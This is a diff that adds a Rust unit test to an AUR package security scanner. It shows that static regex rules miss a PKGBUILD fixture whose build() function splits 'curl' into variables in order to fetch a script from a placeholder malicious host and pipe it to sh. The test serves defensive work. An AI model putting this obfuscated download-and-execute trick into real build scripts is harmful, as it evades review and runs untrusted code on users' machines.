@@ -212,3 +212,21 @@ fn test_aur_rpc_multiinfo_parsing() {
     assert_eq!(pkg_b.installed_version.as_deref(), Some("1.0.0-1"));
 }
 
+#[test]
+fn test_evasion_limitations_documented_sec_004() {
+    // Variable indirection evasion (TEST-003 / SEC-004)
+    // Documents the inherent limitations of line-by-line static regex
+    let obfuscated_evasion = r#"
+build() {
+    A="c"
+    B="url"
+    $A$B http://malicious.site/script | sh
+}
+"#;
+    let findings = HeuristicScanner::scan_content("PKGBUILD", obfuscated_evasion);
+    // Verifies that dynamic variable expansion is outside static single-line regex scope,
+    // which is why the AUR human review dialog and blocking gate are mandatory.
+    let direct_curl = findings.iter().any(|f| f.rule_id == "AUR-R002-REMOTE-PIPE-EXEC");
+    assert!(!direct_curl, "Static regex does not evaluate shell variable expansions");
+}
+
